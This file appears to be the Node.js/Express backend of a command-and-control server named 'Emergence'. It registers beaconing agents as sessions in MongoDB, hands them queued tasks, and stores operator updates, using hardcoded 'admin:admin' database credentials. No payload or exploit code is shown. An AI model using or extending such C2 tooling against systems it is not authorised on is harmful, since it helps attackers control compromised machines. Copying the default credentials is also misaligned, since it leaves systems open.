console.log('Starting Emergence...');

const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const { exec } = require('child_process');

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));

const MongoClient = require('mongodb').MongoClient;
var db

MongoClient.connect('mongodb://admin:admin@127.0.0.1:27017', (err, client) => {
  if (err) return console.log(err)
  db = client.db('prismatica') // whatever your database name is
  app.listen(29001, () => {
    console.log('listening on 29001')
  })
})

app.get('/', function(req, res) {
  res.send('Hello World')
})

//Get API data
app.post('/api/get/', (req, res) => {
   // Determine query type
   console.log(req.body)

   // If query == Get Tasks
   if (req.body.collection == "TASK") {
     // IF beacon... new session?
     const sess = db.collection('SESSIONS');
     sess.find({agentid:req.body.agentid}).limit(1).toArray(function (err, result) {
         if (err) throw err
         console.log(result);
         if (result[0] == null) {
           var sessionDetails = {
             agentid: req.body.agentid,
             type: "Gryffindor",
             user: "ozymandias\\0zm0z1z",
             delay: 5,
             last: Date.now()
           }
           sess.save(sessionDetails, (err, result) => {
             if (err) return console.log(err)
          })
         }
     })

     // Get tasks for agentId
     const collection = db.collection('TASK');
     collection.find({agentid:req.body.agentid}).limit(1).sort({_id: -1}).toArray(function (err, result) {
         if (err) throw err
         //console.log(result[0])
         res.json(result[0])
     })
   }
   else {
      res.send({});
   }
 })
 //TASK Agent
 app.post('/api/task/', (req, res) => {
   console.log(req.body)
   const collection = db.collection('TASK');
   collection.save(req.body, (err, result) => {
     if (err) return console.log(err)
  })
   res.send({});
 })

//Set API data
app.post('/api/update/', (req, res) => {
  const collection = db.collection('C2');
  console.log(req.body)
  collection.insertOne(req.body, (err, result) => {
    if (err) return console.log(err)
 })
  res.send({});
})
//Get API data
app.post('/api/c2/', (req, res) => {
   // Determine query type
   console.log(req.body)



   // If query == Get Tasks
   if (req.body.collection == "C2") {
      // Get tasks for agentId
      const collection = db.collection('C2');
      collection.find().limit(1).sort({_id: -1}).toArray(function (err, result) {
          if (err) throw err
          //console.log(result[0])
          res.json(result[0])
      })
   }
   else {
      res.send({});
   }
 })
 //Session Data
 app.post('/api/sessions/', (req, res) => {
   console.log(req.body)
   const collection = db.collection('SESSIONS');
   collection.find().toArray(function (err, result) {
       if (err) throw err
       console.log(result)
       res.json(result)
   })
 })

//Add junk to db
app.post('/stockdata', (req, res) => {

})
